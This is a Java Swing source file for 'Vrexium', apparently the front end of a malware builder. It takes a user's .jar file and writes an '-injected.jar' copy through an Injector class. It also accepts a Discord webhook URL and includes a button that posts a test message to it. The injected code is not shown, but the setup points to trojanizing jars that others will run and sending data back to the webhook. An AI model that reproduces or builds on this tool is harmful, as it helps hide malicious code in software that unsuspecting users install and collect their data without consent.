package meow.minoa.gui;

import meow.minoa.vrexium.Main;
import meow.minoa.vrexium.utils.Injector;
import meow.minoa.vrexium.utils.OptionsParser;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

public class VrexiumGUI {

    public JFrame frame;

    public VrexiumGUI(){

        try {
            // Load Ubuntu Mono font
            Font ubuntuMonoFont = Font.createFont(Font.TRUETYPE_FONT,
                new URL("https://fonts.gstatic.com/s/ubuntumono/v15/KFOjCneDtsqEr0keqCMhbCc6CsQ.ttf").openStream());
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            ge.registerFont(ubuntuMonoFont);
            
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception ignored) {
            // Fallback to default font if Ubuntu Mono cannot be loaded
        }

        this.frame = new JFrame("Vrexium");
        JPanel panel = new JPanel();
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(800, 450);
        frame.setLocationRelativeTo(null);
        frame.setResizable(false);
        panel.setBackground(new Color(24, 24, 24));
        panel.setLayout(null);

        JLabel label = new JLabel();
        label.setText("Vrexium");
        label.setForeground(new Color(0xFF, 0x66, 0x7D));
        label.setFont(new Font("Segoe UI", Font.BOLD, 28));
        label.setBounds(20, 15, 200, 35);
        panel.add(label);

        JTextField input = new JTextField();
        input.setText("Input File");
        input.setFont(new Font("Ubuntu Mono", Font.PLAIN, 14));
        input.setForeground(Color.WHITE);
        input.setBackground(new Color(16, 16, 16));
        input.setBounds(20, 65, 650, 35);
        input.setBorder(BorderFactory.createLineBorder(new Color(32, 32, 32)));
        input.setCaretColor(Color.WHITE);
        input.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(input.getText().isEmpty()){
                    input.setText("Input File");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(input.getText().equals("Input")){
                    input.setText("");
                }
            }


        });

        JTextField output = new JTextField();
        output.setText("Output File");
        output.setFont(new Font("Ubuntu Mono", Font.PLAIN, 14));
        output.setForeground(Color.WHITE);
        output.setBackground(new Color(16, 16, 16));
        output.setBounds(20, 115, 650, 35);
        output.setBorder(BorderFactory.createLineBorder(new Color(32, 32, 32)));
        output.setCaretColor(Color.WHITE);
        output.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(output.getText().isEmpty()){
                    output.setText("Output File");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(output.getText().equals("Output File")){
                    output.setText("");
                }
            }


        });

        JTextField webhook = new JTextField();
        webhook.setText("Discord Webhook");
        webhook.setFont(new Font("Ubuntu Mono", Font.PLAIN, 14));
        webhook.setForeground(Color.WHITE);
        webhook.setBackground(new Color(16, 16, 16));
        webhook.setBounds(20, 165, 550, 35);
        webhook.setBorder(BorderFactory.createLineBorder(new Color(32, 32, 32)));
        webhook.setCaretColor(Color.WHITE);
        webhook.addFocusListener(new FocusListener() {
            @Override
            public void focusLost(FocusEvent e) {
                if(webhook.getText().isEmpty()){
                    webhook.setText("Discord Webhook");
                }
            }

            @Override
            public void focusGained(FocusEvent e) {
                if(webhook.getText().equals("Discord Webhook")){
                    webhook.setText("");
                }
            }


        });


        JButton inputButton = new JButton();
        inputButton.setBounds(680, 65, 80, 35);
        inputButton.setText("Select");
        inputButton.setForeground(new Color(0xFF, 0x66, 0x7D));
        inputButton.setBackground(new Color(32, 32, 32));
        inputButton.setBorder(BorderFactory.createLineBorder(new Color(48, 48, 48)));
        inputButton.setFont(new Font("Segoe UI", Font.BOLD, 14));
        inputButton.setFocusPainted(false);
        inputButton.setContentAreaFilled(true);

        inputButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JFileChooser fileChooser = new JFileChooser();

                fileChooser.setCurrentDirectory(new File(Injector.decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath())));
                fileChooser.setFileFilter(new FileNameExtensionFilter("Jar files", "jar"));
                int result = fileChooser.showOpenDialog(frame);

                if(result == JFileChooser.APPROVE_OPTION){
                    input.setText(fileChooser.getSelectedFile().getAbsolutePath());
                    output.setText(input.getText().substring(0, input.getText().length() - 4) + "-injected.jar");
                }
            }
        });

        JButton testWebhookButton = new JButton();
        testWebhookButton.setBounds(580, 165, 80, 35);
        testWebhookButton.setText("Test");
        testWebhookButton.setForeground(new Color(0xFF, 0x66, 0x7D));
        testWebhookButton.setBackground(new Color(32, 32, 32));
        testWebhookButton.setBorder(BorderFactory.createLineBorder(new Color(48, 48, 48)));
        testWebhookButton.setFont(new Font("Segoe UI", Font.BOLD, 14));
        testWebhookButton.setFocusPainted(false);
        testWebhookButton.setContentAreaFilled(true);

        testWebhookButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String wh = webhook.getText();
                if(wh.equals("Discord Webhook") || wh.isEmpty()) {
                    JOptionPane.showMessageDialog(null, "Please enter a webhook URL first!");
                    return;
                }
                try {
                    String testJson = "{"
                        + "\"avatar_url\": \"https://squint.tf/icon.webp\","
                        + "\"username\": \"Vrexium Test 🌷\","
                        + "\"embeds\": [{"
                        + "    \"title\": \"Webhook Test\","
                        + "    \"color\": 16737917,"
                        + "    \"description\": \"🌷 Webhook test successful!\","
                        + "    \"image\": {"
                        + "        \"url\": \"https://squint.tf/logo.webp\""
                        + "    },"
                        + "    \"footer\": {"
                        + "        \"text\": \"<3\""
                        + "    }"
                        + "}]"
                        + "}";
                    URL url = new URL(wh);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    
                    try(OutputStream os = conn.getOutputStream()) {
                        byte[] input = testJson.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    
                    int responseCode = conn.getResponseCode();
                    if(responseCode >= 200 && responseCode < 300) {
                        JOptionPane.showMessageDialog(null, "Webhook test successful!");
                    } else {
                        JOptionPane.showMessageDialog(null, "Webhook test failed! Response code: " + responseCode);
                    }
                } catch(Exception ex) {
                    JOptionPane.showMessageDialog(null, "Error testing webhook: " + ex.getMessage());
                }
            }
        });

        JButton injectButton = new JButton();
        injectButton.setBounds(frame.getWidth() / 2 - 80 / 2, frame.getHeight() - 80, 80, 35);
        injectButton.setText("Inject");
        injectButton.setForeground(new Color(0xFF, 0x66, 0x7D));
        injectButton.setBackground(new Color(32, 32, 32));
        injectButton.setBorder(BorderFactory.createLineBorder(new Color(48, 48, 48)));
        injectButton.setFont(new Font("Segoe UI", Font.BOLD, 14));
        injectButton.setFocusPainted(false);
        injectButton.setContentAreaFilled(true);

        injectButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!new File(input.getText()).exists()) {
                    JOptionPane.showMessageDialog(null, "Input file not found!");
                    return;
                }
                List<String> args = new ArrayList<String>();

                args.add("--input");
                args.add(input.getText());
                args.add("--output");
                args.add(output.getText());



                String wh = webhook.getText();
                if(!wh.equalsIgnoreCase("Discord Webhook")){
                    args.add("--webhook");
                    args.add(wh);
                }

                System.out.println(args);
                String[] s = args.toArray(new String[0]);
                Injector.inject(input.getText(), output.getText(), new OptionsParser(s, Main.has, Main.bools));
                JOptionPane.showMessageDialog(null, "Injected successfully!");

            }
        });

        panel.add(input);
        panel.add(inputButton);
        panel.add(output);
        panel.add(webhook);
        panel.add(testWebhookButton);
        panel.add(injectButton);

        frame.add(panel);
        frame.setVisible(true);


    }

}